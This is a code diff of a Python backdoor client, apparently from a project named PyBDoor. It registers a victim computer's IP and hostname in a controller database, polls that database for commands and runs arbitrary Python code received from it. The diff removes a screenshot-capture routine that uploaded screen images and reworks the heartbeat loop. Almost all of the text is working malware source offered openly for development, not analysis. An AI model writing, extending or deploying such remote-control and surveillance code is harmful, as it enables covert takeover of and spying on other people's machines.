@@ -1,4 +1,4 @@
-import sqlite3,socket,os,time,datetime,keyboard,shutil,winreg,pyautogui, threading,pytz, requests
+import sqlite3,socket,os,time,datetime,keyboard,winreg,requests
 
 class backdoor:
     def __init__(self):
@@ -26,31 +26,25 @@ class backdoor:
                       VALUES (?, ?, ?)
             """
             
-            self.cursor.execute(sql_code, (self.ip,socket.gethostname(),datetime.datetime.now(pytz.utc)))
+            self.cursor.execute(sql_code, (self.ip,socket.gethostname(),datetime.datetime.utcnow()))
             self.db.commit()
 
             pcs = self.cursor.execute("SELECT * FROM backdoor_computer").fetchall()
             for pc in pcs:
-                print(pc)
                 if self.ip == pc[-1]:
                     self.pc_id = pc[0]
-        t1 = threading.Thread(target=self.ping)
-        t1.start()
-        while True:
-            self.command_thread()
-            time.sleep(1)
-        
-    def ping(self):
-        self.ping_db = sqlite3.connect("C:/Users/armen/Documents/Github/PyBDoor/server/db.sqlite3")
-        self.ping_cursor = self.ping_db.cursor()
+
+
         while True:
             sql_code = """UPDATE backdoor_computer
                         SET last_online = ?
                         WHERE id = ?
                 """
-            self.ping_cursor.execute(sql_code, (datetime.datetime.now(pytz.utc), self.pc_id))
-            self.ping_db.commit()
-            time.sleep(5)
+            self.cursor.execute(sql_code, (datetime.datetime.utcnow(), self.pc_id))
+            self.db.commit()
+            self.command_thread()
+            time.sleep(1)
+        
 
     def run(self, code):
         output = ""
@@ -88,25 +82,6 @@ class backdoor:
                 delay_command = command.split("(")
                 time_to_delay = delay_command[1].replace(")", "")
                 time.sleep(float(time_to_delay))
-            elif command.startswith("screenshot()"):
-                myScreenshot = pyautogui.screenshot()
-                myScreenshot.save(r'screenshot.png')
-                jsonString = bytearray()
-                with open("screenshot.png", "rb") as r:
-                    while True:
-                        data = r.read(1024)
-                        if not data:
-                            break
-                        jsonString.extend(data)
-                sql_code = """INSERT INTO backdoor_image
-                      (img_data, img_name)                 
-                      VALUES (?, ?)
-                """
-                with open("test.png", "wb+") as w:
-                    w.write(jsonString)
-                self.cursor.execute(sql_code, (r, "screenshot.png"))
-                self.db.commit()
-                os.remove("screenshot.png")
             elif command.startswith("python"):
                 python_code = ""
                 for i in range(1, len(commands_to_execute)):
